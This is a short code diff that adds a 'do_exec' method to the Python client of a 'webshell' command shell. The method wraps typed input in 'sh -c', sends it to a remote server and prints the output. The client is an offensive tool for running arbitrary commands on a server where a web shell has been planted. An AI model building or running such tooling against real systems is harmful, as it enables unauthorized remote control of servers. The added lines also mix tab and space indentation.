@@ -114,6 +114,13 @@ class webshell(Cmd):
 		req = "export PATH=$PATH:" + extra_path + "; cd " + path + ';' + cmd + " 2>&1;"
 		return req
 
+	def do_exec(self, line):
+		cmd = 'sh -c ' + line + ' 2>&1;'
+                print cmd
+		resp = self.ask_server(cmd)
+		self.stdout.write(resp + '\n')
+		self.set_prompt()
+
 	def default(self, line):
 		try:
 			req = self.forge_request(self.path, line);
